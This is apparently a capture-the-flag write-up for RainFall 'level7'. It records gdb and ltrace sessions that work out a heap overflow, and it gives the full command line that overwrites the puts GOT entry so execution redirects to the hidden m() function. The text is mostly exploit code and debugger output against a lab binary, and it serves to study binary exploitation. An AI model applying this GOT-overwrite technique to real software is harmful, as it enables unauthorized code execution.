```
0x080484f4  m
0x08048521  main
```

./level7 $(python -c 'print "A" * 21 + "\x08\x04\x84\xf4"[::-1]') "BBBBBBBB"

```
(gdb) x 0x8049960
0x8049960 <c>:	 ""
  
(gdb) p 0x44
$6 = 68
  
(gdb) x 0x8048703
0x8048703:	 "~~"
```
  
```
(gdb) run "AAAABBBBCCCCDDDD" "ZZZZ1111"

(gdb) x/60wx 0x804a000
  
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x42424242
0x804a020:	0x43434343	0x44444444	0x00000000	0x0804a038
0x804a030:	0x00000000	0x00000011	0x5a5a5a5a	0x31313131

(gdb) p/c 0x5a = 'Z'
 
 argv1 write at the heap pointed by p/x 0x804a010+8 = 0x804a018
 argv2                              0x804a038

confirmed by ltrace

level7@RainFall:~$ ltrace ./level7 AAAAAAAA BBBBBBBB

  strcpy(0x0804a018, "AAAAAAAA")
  strcpy(0x0804a038, "BBBBBBBB")

 ```
  
  ```
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
  
  (gdb) disass 0x8048400
    Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
  ```
  
  address of puts `0x8049928` and address of m() function `0x080484f4`
  
  
  `./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')`
  
 Heap befor srcpy 1 
```
"--------------HEAP------------"
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 
```
  Heap after srcpy 1
  ```
  "--------------HEAP------------"
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928
```
after strcpy2
```
(gdb) disass 0x8048400
puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x080484f4

(gdb) x 0x080484f4
0x80484f4 <m>:	0x83e58955
```



  
  
  
  
  
